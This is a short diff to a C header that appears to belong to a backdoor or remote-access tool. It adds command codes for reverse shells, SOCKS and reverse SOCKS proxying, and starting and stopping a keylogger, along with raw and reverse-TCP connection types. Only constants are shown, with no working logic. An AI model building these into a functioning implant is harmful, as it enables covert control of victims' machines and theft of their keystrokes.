@@ -4,6 +4,7 @@
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 
+// actions
 #define UPLOAD      1
 #define DOWNLOAD    2
 #define SHELL       3
@@ -13,7 +14,20 @@
 #define RDOWNLOAD   7
 #define RSHELL      8
 #define DIRECTRAW   9
-#define CROND		10
+#define SOCKS       10
+#define RSOCKS      11
+#define SKEYLOG     12
+#define KKEYLOG     13
+#define START       14
+#define STOP        15
+
+// connection type
+#define RAW         1
+#define TCP         2
+#define RTCP        3
+
+// services
+#define KEYLOG      1
 
 #define BUFSIZE 256
 #define WCHAR 0x0c
